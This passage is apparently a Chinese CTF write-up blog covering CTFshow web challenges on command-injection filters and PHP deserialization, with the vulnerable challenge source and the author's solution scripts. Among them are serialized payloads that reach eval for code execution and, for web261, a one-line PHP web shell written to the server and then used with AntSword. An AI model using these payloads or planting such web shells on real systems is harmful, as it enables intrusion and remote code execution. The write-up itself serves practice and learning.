        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);
    &#125;
&#125;<span class="keyword">else</span>&#123;
    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
&#125;</code></pre>
<p><code>;</code>不能用了，但是计划通</p>
<p>同web42</p>
<h3 id="web44"><a class="markdownIt-Anchor" href="#web44"></a> web44</h3>
<pre><code class="highlight plaintext">&lt;?php

if(isset($_GET[&#x27;c&#x27;]))&#123;
    $c=$_GET[&#x27;c&#x27;];
    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;
        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>
<p>换通配符，没了</p>
<h3 id="web56"><a class="markdownIt-Anchor" href="#web56"></a> web56</h3>
<h2 id="反序列化"><a class="markdownIt-Anchor" href="#反序列化"></a> 反序列化</h2>
<h3 id="web254"><a class="markdownIt-Anchor" href="#web254"></a> web254</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);

<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>
<span class="class"></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span> = <span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
    &#125;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>, <span class="variable">$p</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="variable">$u</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password === <span class="variable">$p</span>) &#123;
            <span class="variable language_">$this</span>-&gt;isVip = <span class="literal">true</span>;
        &#125;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
    &#125;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;isVip) &#123;
            <span class="keyword">global</span> <span class="variable">$flag</span>;
            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span> . <span class="variable">$flag</span>;
        &#125; <span class="keyword">else</span> &#123;
            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;
        &#125;
    &#125;
&#125;

<span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>)) &#123;
    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();
    <span class="keyword">if</span> (<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;
        <span class="keyword">if</span> (<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>()) &#123;
            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();
        &#125;
    &#125; <span class="keyword">else</span> &#123;
        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
    &#125;
&#125;</code></pre>
<p>就是简单的传。别想歪了(谁想歪了我不说)</p>
<h3 id="web255"><a class="markdownIt-Anchor" href="#web255"></a> web255</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);
<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;
            <span class="keyword">global</span> <span class="variable">$flag</span>;
            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;
        &#125;<span class="keyword">else</span>&#123;
            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;
        &#125;
    &#125;
&#125;
<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    
    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;
        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;
            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();
        &#125;
    &#125;<span class="keyword">else</span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
    &#125;
&#125;</code></pre>
<p>不帮你创，让你自己搞一搞，序列化入门说是</p>
<pre><code class="highlight plaintext">&lt;?php
class ctfShowUser&#123;
    public $username=&#x27;1&#x27;;
    public $password=&#x27;1&#x27;;
    public $isVip=true;
&#125;
$A=new ctfShowUser();
echo serialize($A);</code></pre>
<p>发现传不进去，一查发现<strong>Cookie中将”作为截断符号</strong></p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/C:%5CUsers%5Cayano%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250710161829381.png" alt="image-20250710161829381"></p>
<p>感觉分号也不是很友好啊。<code>url编码整一个</code></p>
<h3 id="web256"><a class="markdownIt-Anchor" href="#web256"></a> web256</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);

<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;
            <span class="keyword">global</span> <span class="variable">$flag</span>;
            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;
                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;
              &#125;
        &#125;<span class="keyword">else</span>&#123;
            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;
        &#125;
    &#125;
&#125;

<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    
    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;
        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;
            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();
        &#125;
    &#125;<span class="keyword">else</span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;
    &#125;
&#125;</code></pre>
<p>比上一题多了个<code>username!=passwd</code></p>
<h3 id="web257"><a class="markdownIt-Anchor" href="#web257"></a> web257</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span>
<span class="class">    &#125;</span>
<span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span>
<span class="class">    &#125;</span>
<span class="class">&#125;</span>
<span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;
    &#125;
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$code</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
    &#125;
&#125;
<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);
    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);
&#125;</code></pre>
<p>这里看上部分即可</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span>
<span class="class">    &#125;</span>
<span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span>
<span class="class">    &#125;</span>
<span class="class">&#125;</span>
<span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;
    &#125;
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$code</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
    &#125;
&#125;</code></pre>
<p>直接利用<code>backDoor</code>类来RCE</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span>=True;
    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;&#x27;</span>;
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;
&#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();
<span class="variable">$a</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span>
<span class="class"><span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>($<span class="title">a</span>));</span></code></pre>
<p>成功执行</p>
<h3 id="web258"><a class="markdownIt-Anchor" href="#web258"></a> web258</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span>
<span class="class">    &#125;</span>
<span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span>
<span class="class">    &#125;</span>
<span class="class"></span>
<span class="class">&#125;</span>
<span class="class"></span>
<span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;
    &#125;
&#125;

<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$code</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
    &#125;
&#125;

<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;
        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);
    &#125;
    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);
&#125;</code></pre>
<p>Cookie不允许O/C开头，后面不准接数字</p>
<h3 id="web259open"><a class="markdownIt-Anchor" href="#web259open"></a> web259(open)</h3>
<pre><code class="highlight plaintext">
$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);
array_pop($xff);
$ip = array_pop($xff);
if($ip!==&#x27;127.0.0.1&#x27;)&#123;
	die(&#x27;error&#x27;);
&#125;else&#123;
	$token = $_POST[&#x27;token&#x27;];
	if($token==&#x27;ctfshow&#x27;)&#123;
		file_put_contents(&#x27;flag.txt&#x27;,$flag);
	&#125;
&#125;</code></pre>
<h3 id="web260"><a class="markdownIt-Anchor" href="#web260"></a> web260</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);

<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;
    <span class="keyword">echo</span> <span class="variable">$flag</span>;
&#125;</code></pre>
<p>本来在想是不是要用原生类的，但是发现好像是杀鸡用牛刀，还是对反序列化这边有一些偏执的固有印象啊。。</p>
<p>希望后面能消除这种偏见。</p>
<p>这里直接序列化一个字符串即可</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$a</span>=<span class="string">&#x27;ctfshow_i_love_36D&#x27;</span>;
<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</code></pre>
<h3 id="web261"><a class="markdownIt-Anchor" href="#web261"></a> web261</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

<span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>;
    <span class="keyword">public</span> <span class="variable">$code</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;
        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;
            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);
        &#125;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
    &#125;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;
        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];
        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];
        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;
            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);
        &#125;
    &#125;
&#125;

<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</code></pre>
<p>几个创建时候调用的魔术方法可以直接不看了。。</p>
<p>这里了解到了从7.4.0开始，如果类中同时定义了 <code>__unserialize() 和 __wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，__wakeup() 方法会被忽略，那么直接触发文件写入写马即可</p>
<p>结合<code>__unserialize</code>内的代码，可以看出这边是一个弱比较</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;877.php&#x27;</span>;<span class="comment">//弱比较</span>
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;&#x27;</span>;
&#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>();
<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</code></pre>
<p>最后蚁剑即可</p>
<h3 id="web262"><a class="markdownIt-Anchor" href="#web262"></a> web262</h3>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
    <span class="comment">/*</span>
<span class="comment"># -*- coding: utf-8 -*-</span>
<span class="comment"># <span class="doctag">@Author</span>: h1xa</span>
<span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span>
<span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span>
<span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span>
<span class="comment"># <span class="doctag">@message</span>.php</span>
<span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span>
<span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span>
<span class="comment"></span>
<span class="comment">*/</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$from</span>;
    <span class="keyword">public</span> <span class="variable">$msg</span>;
    <span class="keyword">public</span> <span class="variable">$to</span>;
    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;
        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;
        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;
    &#125;
&#125;

<span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];
<span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];
<span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;
    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);
    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));
    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));
    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;
&#125;

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre>
<p>一眼字符串逃逸</p>
<p>但是传完cookie干什么呢。。猜测是要逃逸user为amdin，那就扫一下有没有其他的php文件存在哈,就扫出来一个<code>flag.php</code></p>
<p>后来根据其他师傅的wp才发现注释里有一个<code>message.php</code>，眼瞎领域大神发力了嘻嘻</p>
<p>看一眼<code>message.php</code></p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
